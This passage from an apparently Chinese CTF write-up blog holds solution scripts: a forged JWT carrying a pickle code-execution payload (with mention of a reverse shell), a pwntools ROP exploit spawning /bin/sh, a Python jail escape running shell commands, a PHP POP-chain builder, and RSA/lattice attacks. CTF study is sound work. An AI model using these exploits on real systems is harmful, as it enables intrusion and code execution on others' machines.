class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.js</span></span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cert = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;\\b37cf68716c3859b_65537_pkcs1.pem&#x27;</span>);</span><br><span class="line"><span class="comment">// console.log(privateKey);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123;<span class="attr">username</span>: <span class="string">&quot;aaa&quot;</span>,<span class="attr">password</span>: <span class="string">&quot;08f8e0260c64418510cefb2b06eee5cd&quot;</span>,<span class="attr">is_admin</span>: <span class="literal">true</span>,<span class="attr">introduction</span>: <span class="string">&quot;gASVPgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwiX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ3NsZWVwIDUnKZSFlFKULg==&quot;</span>&#125;, cert, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token)</span><br><span class="line"></span><br><span class="line"><span class="comment">// **************************// </span></span><br><span class="line"><span class="comment">// node 1.js</span></span><br><span class="line"><span class="comment">// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFhYSIsInBhc3N3b3JkIjoiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCJpc19hZG1pbiI6dHJ1ZSwiaW50cm9kdWN0aW9uIjoiZ0FTVlBnQUFBQUFBQUFDTUNHSjFhV3gwYVc1emxJd0VaWFpoYkpTVGxJd2lYMTlwYlhCdmNuUmZYeWduYjNNbktTNXplWE4wWlcwb0ozTnNaV1Z3SURVbktaU0ZsRktVTGc9PSIsImlhdCI6MTczMDYwNDAzMH0.ro7Xyjbw5uyYmIh1TRYDpiWHKoYDtV-fEQ9yhIumzz0</span></span><br></pre></td></tr></table></figure><p>修改cookie，尝试成功触发sleep，改pickle为反弹shell代码，成功反弹shell，<code>cat /flag</code> 得到flag。</p><p>​</p><h2 id="Reverse-Pwn"><a href="#Reverse-Pwn" class="headerlink" title="Reverse/Pwn"></a>Reverse/Pwn</h2><h3 id="WhoIsAdmin"><a href="#WhoIsAdmin" class="headerlink" title="WhoIsAdmin"></a>WhoIsAdmin</h3><blockquote><p>尝试对AcountSystem进行攻击，获取shell，拿到flag。你需要想办法让admin_login_state登录状态为1，并买下该系统，才能改系统名称哦。前置知识：Crypto：AES-CBC翻转攻击，Pwn：整数溢出、64位ret2syscall</p></blockquote><p>分析菜单的主要功能如下：</p><p>1-新建普通用户，用户名=<code>BinaryCryptoYYDS</code>，AES加密，得到密文<br>3-显示 <code>money</code><br>4-输入 <code>x</code> 计算RSA，成功后，输入 <code>y</code>，<code>money+=(-100)*y</code>，<code>LimitAcountNumber+=y</code><br>5-显示 <code>LimitAcountNumber</code><br>6-如果 <code>money&gt;50000</code>，买下系统，则 <code>buy=1</code><br>7-输入密文，AES解密得到 用户名=<code>AdminAdminAdminA</code>，则 <code>admin_login_state=1</code><br>8-满足用户是 <code>admin</code>（<code>admin_login_state == 1</code>）且买下系统（<code>buy == 1</code>）后，可以修改系统名字</p><p><strong>攻击思路</strong></p><p>先买系统，输入4，计算 <code>x</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">281443</span></span><br><span class="line">p = <span class="number">431</span></span><br><span class="line">q = <span class="number">653</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">c = <span class="number">222876</span></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># 1640</span></span><br></pre></td></tr></table></figure><p>然后整数溢出，使 <code>money&gt;50000</code>，输入6，买下系统，<code>buy=1</code>。</p><p>下一步伪造管理员登录，输出7，cbc字节翻转攻击，满足用户名=<code>AdminAdminAdminA</code>，<code>admin_login_state=1</code>。</p><p>最后改系统名字，输入8，<code>scanf</code> 栈溢出，ret2syscall。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">24011</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># buy = 1</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;satisfied???\n&#x27;</span>,<span class="string">b&#x27;1640&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;add?\n&#x27;</span>,<span class="string">b&#x27;-500&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># admin_login_state = 1</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">m0 = <span class="string">&#x27;BinaryCryptoYYDS&#x27;</span></span><br><span class="line">m1 = <span class="string">&#x27;AdminAdminAdminA&#x27;</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;authcode: &#x27;</span>)</span><br><span class="line">c0 = r.recvline().strip().decode()</span><br><span class="line"><span class="built_in">print</span>(c0)</span><br><span class="line">c = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(c0[:<span class="number">32</span>]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    c[i] ^= (<span class="built_in">ord</span>(m0[i])^<span class="built_in">ord</span>(m1[i]))</span><br><span class="line">new_c = <span class="built_in">bytes</span>(c).<span class="built_in">hex</span>()+c0[<span class="number">32</span>:]</span><br><span class="line"><span class="built_in">print</span>(new_c)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;authcode: \n&#x27;</span>,new_c.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># change name</span></span><br><span class="line">pop_rax=<span class="number">0x40153c</span></span><br><span class="line">pop_rdi=<span class="number">0x402db3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x402db1</span></span><br><span class="line">pop_rdx=<span class="number">0x401538</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">syscall=<span class="number">0x401527</span></span><br><span class="line">AccountSystemName_addr=<span class="number">0x4052F0</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;name: &#x27;</span>)</span><br><span class="line">pl=flat([</span><br><span class="line">    <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x20</span>+<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>),</span><br><span class="line">    pop_rax,<span class="number">59</span>,</span><br><span class="line">    pop_rdi,AccountSystemName_addr,</span><br><span class="line">    pop_rsi_r15,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">    pop_rdx,<span class="number">0</span>,</span><br><span class="line">    syscall</span><br><span class="line">    ])</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;PwnAndCryptoAreBothVeryInteresting&#125;</span></span><br></pre></td></tr></table></figure><p>​</p><h1 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h1><h2 id="Misc-3"><a href="#Misc-3" class="headerlink" title="Misc"></a>Misc</h2><h3 id="hard-jail"><a href="#hard-jail" class="headerlink" title="hard_jail"></a>hard_jail</h3><blockquote><p>waf好短，看起来好简单OUO</p></blockquote><p>交互拿到源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">black=[&quot;(&quot;,&quot;)&quot;,&quot;\&#x27;&quot;,&quot;\&quot;&quot;,&quot;@&quot;]</span><br><span class="line">banner=&#x27;&#x27;&#x27; _                   _        _       _ _</span><br><span class="line">| |__   __ _ _ __ __| |      (_) __ _(_) |</span><br><span class="line">| &#x27;_ \ / _` | &#x27;__/ _` |      | |/ _` | | |</span><br><span class="line">| | | | (_| | | | (_| |      | | (_| | | |</span><br><span class="line">|_| |_|\__,_|_|  \__,_|____ _/ |\__,_|_|_|</span><br><span class="line">                     |_____|__/&#x27;&#x27;&#x27;</span><br><span class="line">print(banner)</span><br><span class="line">print(&quot;input your code or input &#x27;show&#x27; to get the source code&quot;)</span><br><span class="line">while True:</span><br><span class="line">    code = input(&quot;&gt;&gt;&quot;)</span><br><span class="line">    if code==&quot;show&quot;:</span><br><span class="line">        print(open(__file__,&quot;r&quot;).read())</span><br><span class="line">        continue</span><br><span class="line">    if not code.isascii():</span><br><span class="line">        exit(&quot;Please input ascii&quot;)</span><br><span class="line">    if len(code)&gt;50:</span><br><span class="line">        exit(&quot;code too long&quot;)</span><br><span class="line">    for word in black:</span><br><span class="line">        if word in code:</span><br><span class="line">            exit(&quot;hacker!!!!&quot;)</span><br><span class="line">    exec(code)</span><br></pre></td></tr></table></figure><p>覆盖black为空即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;black=[]</span><br><span class="line">&gt;&gt;print(__import__(&quot;os&quot;).popen(&quot;ls /home/*&quot;).read())</span><br><span class="line">&gt;&gt;print(__import__(&quot;os&quot;).popen(&quot;nl /h*/*/*&quot;).read())</span><br></pre></td></tr></table></figure><p>​</p><h3 id="Secret-of-Starven"><a href="#Secret-of-Starven" class="headerlink" title="Secret of Starven"></a>Secret of Starven</h3><blockquote><p>有黑客进入了Starven的电脑，还偷走了他的学习资料，你能帮助他挽回尊严嘛</p></blockquote><p>SMB流量，用 <code>smb2</code> 筛选，在405提取 <code>secret.zip</code> 数据，zip爆破，密码：<code>spellorstarve</code>。</p><p>解压得到flag：<code>SYC&#123;D0n7_spre0d_St@rven&#39;s_s3crEt&#125;</code>。</p><p>​</p><h2 id="Crypto-3"><a href="#Crypto-3" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easy-LLL"><a href="#easy-LLL" class="headerlink" title="easy_LLL"></a>easy_LLL</h3><blockquote><p>升级svp,flag前缀为SYC{xx}</p></blockquote><p>HNP问题，$a_im+b_i \equiv c_i \pmod p \Rightarrow -b_i=a_im-c_i+k_ip$，构造格，LLL求解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">114770017142688382362918268558878024848633097928402093647914503696492833723966801545716194546592346338592062332306371502256979159033965343002132956304625610134374822329402499359634555710129039614275145668904822690744696925414716152630310915301980153974374009140517084226870950134327432658087834138202887501571</span></span><br><span class="line">c = [<span class="number">25269157674120082500323585451842928560404625967932662908517922704871828513397233858615005968124017428639853960550468542894270451871612496631645175015826203493265945456529848647562285359912541672751550625137876486033809099678631009005979648033707322772087110235116987698692692467320479776960630479772236446980</span>, <span class="number">75827517416784647262997004080634347924631190865715212882627791181841845414253117114184423517850773219376565782814219713490136873921446382123059696483594598328510450811390866671002685611755205236016843942407419858592870716928648777362367108239158432436307113173823883182666320180058177554647020175991566479974</span>, <span class="number">4000439731719746534404360339840675006453847582492745979982221624660296805996044239209286181541462187650487112017410839740281883027081539802479046385802021188067656190594734619927933032154534742175380783895559841318520045144113562164247717915766667365412215754183668349398802684299015216478025166881475794536</span>, <span class="number">16711257143606850336586355581909703391105580636095435863487225535083010317005439435375105800641024112138121810242207127443011036209544967633123983636015153089843815287370646565071784002098183021489882046492609441708361550786752857773565252821037805549119284258373739189052221307754872723967188683410620808193</span>, <span class="number">106512227999048988543537542345636528925594107128125030635002665980574709006558840446189017357623681828677935125012144689963798865971782914704616798239451971370511961281779438306334353650663495164449411037055054859128957955413918744183200858441122917851347996800797164614883188302584586112732819164555910532500</span>]</span><br><span class="line">a = [<span class="number">177876163920838720585474640511391249051418827853372387342635245341495792468826199544624082182728094652999191797576747605771062756630817438777653951772485569478516324903956113309190795622258346824643390004835397272889256696087356239515881459115499360779486974615331766141255410923960657795391638070660994726539</span>, <span class="number">154147211832384364492785997490497428696214843927503185938896425556028644075902949520267734189423717477702286854849502563505554965833703544305651488482204719931055591825164774932532116940955079750398001376723036214113076925445019856194390932639722726924707396244454184674407094860919513514591518499956074524561</span>, <span class="number">162236910312416448303316079284626131452444352290110477620135842885125003493068172330766174225997049094080836685617836911475638508283918576304502582848847097467251286819613975600023439985149604495163647781268904127545271241114039490048103188362740808427663167350820948490766499995036870926879430699822216419877</span>, <span class="number">156324330649465856865205652642919116551480610060830456323361514761783406613162826555066367215822747145109223530381689780625035795004458919262362420375225560790467893332585836287433463308447660726674632677063603419250881619682710122472587150879771212601074942044613408069114640355658551759306352327418458216623</span>, <span class="number">94727349364308455432706991721504607810501329870619614073375570944298709074650444442139356318854809081925625009516102978518170343525726627149123655332253529418292440747073463615106501530133930750010290051226765906194210372904323460884238665194406125116885468971886527174150462509520345910607640580833401931201</span>]</span><br><span class="line">t = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">A = a[:]</span><br><span class="line">B = [-k <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct Lattice</span></span><br><span class="line">K = <span class="number">2</span>^<span class="number">400</span>   <span class="comment"># ki &lt; 2^400</span></span><br><span class="line">X = p * identity_matrix(QQ, t) <span class="comment"># t * t</span></span><br><span class="line">Z = matrix(QQ, [<span class="number">0</span>] * t + [K/p] + [<span class="number">0</span>]).transpose() <span class="comment"># t+1 column</span></span><br><span class="line">Z2 = matrix(QQ, [<span class="number">0</span>] * (t+<span class="number">1</span>) + [K]).transpose()    <span class="comment"># t+2 column</span></span><br><span class="line"></span><br><span class="line">Y = block_matrix([[X],[matrix(QQ, A)], [matrix(QQ, B)]]) <span class="comment"># (t+2) * t</span></span><br><span class="line">Y = block_matrix([[Y, Z, Z2]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find short vector</span></span><br><span class="line">Y = Y.LLL()</span><br><span class="line"></span><br><span class="line"><span class="comment"># check</span></span><br><span class="line">k0 = ZZ(Y[<span class="number">1</span>, <span class="number">0</span>] % p)</span><br><span class="line">x = ZZ(Y[<span class="number">1</span>, -<span class="number">2</span>] / (K/p) % p)</span><br><span class="line"><span class="keyword">assert</span>(k0 == (A[<span class="number">0</span>]*x + B[<span class="number">0</span>]) % p)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(x)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;125b-5c7b19c7-90e2-8d87c8a8&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="highlow"><a href="#highlow" class="headerlink" title="highlow"></a>highlow</h3><blockquote><p>高，低位，异或，flag前缀为SYC{xx}</p></blockquote><p>flag为44位，高1024-44*8-400=272为0，低400位为0，coppersmith求解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">11017336122691034053241992293963114590816319844384287448629663672049205892828600396465505710922907685545939978376321927394655458727494361852952898280905220963163625482295222856129164172619564344634365520328815972232825639292605311741655988427166811406091329613627961070231457035303298793651546412496975662225857123805867756651901374507447803198638466304862480202099076813471571495380132563252630789218173007275890600746758285415274434393381125742526014986039652677605642226576741424053749512280825231217420239089105794080707322357602941046822659335487420672699022969372037662958497832065752272061853723653365171768556</span></span><br><span class="line">n = <span class="number">14091206320622523674847720139761543154822190879035380245424481267482550932229611965964424965958386255076593911062804299275581742665134207390532802109700225140999812698020838683697375891035625255222001884477214361835101442288725383073334392995186053867261497679234362794914108033574681292656522807928680812726462195077833184018122369579002715900477290345396065912536529290811962117814900448319776590712946259540382461632468634827959957286905806432005632864663985014872365672653476822833921870071851313424903481282350342304819149894610089804321405589433980650340610521659031234826823369114800150883988613877877881069579</span></span><br><span class="line">pxor = <span class="number">124229245244085791439650934438639686782423445183921252684721764061493908790073948877623812930339081158169421854801552819088679937157357924845248082716160727839419054107753000815066526032809275137495740454967765165248115412626716101315676902716808647904092798908601183908297141420793614426863816161203796966951</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1024-44*8-400=272</span></span><br><span class="line">ph = pxor &gt;&gt; (<span class="number">44</span>*<span class="number">8</span>+<span class="number">400</span>) &lt;&lt; (<span class="number">44</span>*<span class="number">8</span>+<span class="number">400</span>)</span><br><span class="line">pl = pxor % (<span class="number">2</span>^<span class="number">400</span>)</span><br><span class="line">P.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = ph + x * <span class="number">2</span>^<span class="number">400</span> + pl</span><br><span class="line">root = f.monic().small_roots(X=<span class="number">2</span>^(<span class="number">44</span>*<span class="number">8</span>), beta=<span class="number">0.48</span>)</span><br><span class="line">p = ph + <span class="built_in">int</span>(root[<span class="number">0</span>]) * <span class="number">2</span>^<span class="number">400</span> + pl</span><br><span class="line"></span><br><span class="line">q = n // p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;2f521b13bc9d6e932e9f5cbe511112df9e3a9c6&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="Number-theory"><a href="#Number-theory" class="headerlink" title="Number theory"></a>Number theory</h3><blockquote><p>费马，flag前缀为SYC{xx}</p></blockquote><p>$h_0 \equiv (1012q + 2024)^p \pmod n \\\Rightarrow h_0 \equiv (1012q + 2024)^p \pmod q \\\Rightarrow h_0 \equiv 2024^p \pmod q \\\Rightarrow 2024^p = h_0-kq \\\Rightarrow 2024^n = (h_0-kq)^q \\\Rightarrow 2024^n=h_0^q + Kq \\\Rightarrow 2024^n \equiv h_0 \pmod q$</p><p>所以 $2024^n-h_0$，必然是 $q$ 的倍数。</p><p>$h_1=a_1p+b_1q,h_2=a_2p+b_2q \\\Rightarrow b_2h_1=a_1b_2p+b_1b_2q,b_1h_2=a_2b_1p+b_1b_2q$</p><p>相减有 $b_2h_1-b_1h_2=(a_1b_2-a_2b_1)*p$，爆破小位数的 $b_1,b_2$ 求gcd得 $p$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">h0 = <span class="number">3220497006402049508998763812708472832647814868290156746347730942871191356255789659370553564805270033069126673720344310199953651087754072020225702916105541813428786992668144172000495857408180695235017329451164552864440669887978780387408892281885728829108705426036377534262123812335152528611168777211280571694805002313718755871797426493929314877273385162106226582910473718696585558235361302211164190022765345477880209355073870857330694309139033191510002831755011163554405501084092882774630793037506647051531578470767441695642108269033577519614546722167605348209455599860877630930453549375215766657975702946679735793440</span></span><br><span class="line">n1 = <span class="number">20609629372145649869124883931477035418773265506807982287973634398860995335157854064383658546598627777214414513344620919765235474447787454254677033199140440513722365295528339478763686234572386246701669139829187532179573583918405628738545887852577214800663095592976049188005405242091639210252676232732956312108538849591909382864675439965387851084691144379692503823575367370407191667133473482821484955537306602611587604747693171586870973700406072872451067709522642066831289686968535823774273770385924779368338446367102184983154486987531633971065357864924738084803301054789863293592286600424063888458243900130876991944561</span></span><br><span class="line">h1 = <span class="number">49194502383195208917988199785355579000471120627698824524136563939112767971337049691779758664899497703009458337602635607307068610164325874221815125058246159504553260658300727486252329656228567456351563661171511248498573151135374757953887871426130912974127123668357951196795364055703535399924661649957282476915345782505912688106575686848420343362888</span></span><br><span class="line">h2 = <span class="number">56029812337811022982598747354987989915364610368395101948222609237230875599013444593473706280586983516630982411154519894488542135837471701015074142753084529513202513061481615522865380857058628008542724882609524855349464549317203533208567803034618377155637303135785566874122555481931560957334493233423618193735362609235034574175221191665401074291634</span></span><br><span class="line">n2 = <span class="number">21127172569887870569621986802814771398069606826661397979515556618791602174698226712111670185315617811180192688381471253591193212149192104216153890060029438171543010427356810059660168369171504065120474047401466632600230981702536898738744701541132759858595341068713321976579864810553447534204513491008705215041861247277449063318972113826820821732327255577559447446606667162763843696891825420560307688553022453470653875157114663943723258181186659915926780802902213978395961981750159147594076399769386787561910947372748908551775527715538708855235861297549189165238857651886658156332640360898769204102407630920314871304057</span></span><br><span class="line">c = <span class="number">5607552428806279725164332098717496105359323731793797865776852054987286366396268835656116948807084338497364746716217052175055013330847114498067023163878490040957130515880922531725226729467904687450269817551037876044274898360914422201634758724176912018795267171627398316542607462818553194467631468793807762529509728325759331142060865432879561622747895422022839077034959965640817419843376693946391886148327389538923557583964708218796910422008150480950732394548385083016293891237783400286493750498647816940000092965104858068292374074379723230507283787259827582725133425982004517180631242028412315096023451549819804660838</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">q = GCD(n1, <span class="built_in">pow</span>(<span class="number">2024</span>,n1,n1)-h0)</span><br><span class="line"></span><br><span class="line">primelist = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">12</span>,<span class="number">2</span>**<span class="number">13</span>) <span class="keyword">if</span> isPrime(i)]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(primelist))</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> primelist:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> primelist:</span><br><span class="line">        g = GCD(n2, <span class="built_in">abs</span>(b*h1-a*h2))</span><br><span class="line">        <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">            p = g</span><br><span class="line"></span><br><span class="line">d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;492aebb6-9c16-4b1a-ac42-fc608bf6063f&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h2 id="Web-3"><a href="#Web-3" class="headerlink" title="Web"></a>Web</h2><h3 id="not-just-pop"><a href="#not-just-pop" class="headerlink" title="not_just_pop"></a>not_just_pop</h3><blockquote><p>听Bingfeng师傅说他的ez_pop很难，要不试试这个更简单的?</p></blockquote><p>pop链构造，传给Syclover参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lhRaMK7</span>:</span><br><span class="line">    public_love=<span class="string">&#x27;phpinfo();&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Starven</span>:</span><br><span class="line">    public_friend=lhRaMK7()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SYC</span>:</span><br><span class="line">    public_forever=Starven()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Parar</span>:</span><br><span class="line">    private_execurise=<span class="string">&#x27;man!&#x27;</span></span><br><span class="line">    public_hansome=SYC()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Starven</span>:</span><br><span class="line">    public_girl=Parar()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lhRaMK7</span>:</span><br><span class="line">    public_Do=Starven()</span><br><span class="line">    public_You=SYC()</span><br><span class="line"></span><br><span class="line">s = serialize(lhRaMK7())</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(s[:-<span class="number">1</span>].encode()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 